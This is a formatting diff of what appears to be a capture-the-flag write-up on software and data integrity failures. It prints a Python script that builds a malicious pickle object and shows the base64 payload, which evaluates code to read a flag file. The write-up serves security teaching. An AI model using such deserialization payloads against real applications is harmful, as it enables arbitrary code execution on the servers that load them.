@@ -65,8 +65,7 @@ Ans. THM{SSTI_FLAG_OBTAINED}
 
 Software or Data Integrity Failures occur when an application relies on code, updates, or data it assumes are safe, without verifying their authenticity, integrity, or origin. This includes trusting software updates without verification, loading scripts or configuration files from untrusted sources, failing to validate data that impacts application logic, or accepting data such as binaries, templates, or JSON files without confirming whether it has been altered.
 
-```
-import pickle
+```import pickle
 import base64
 
 class Malicious:
@@ -79,13 +78,10 @@ class Malicious:
 payload = pickle.dumps(Malicious())
 encoded = base64.b64encode(payload).decode()
 print(encoded)
-
 ```
 we will run this and we will get the base64 code encoded with the payload.
-```
-gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
 
-```
+`gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=`
 
 this will be the base64 version of the payload.
 
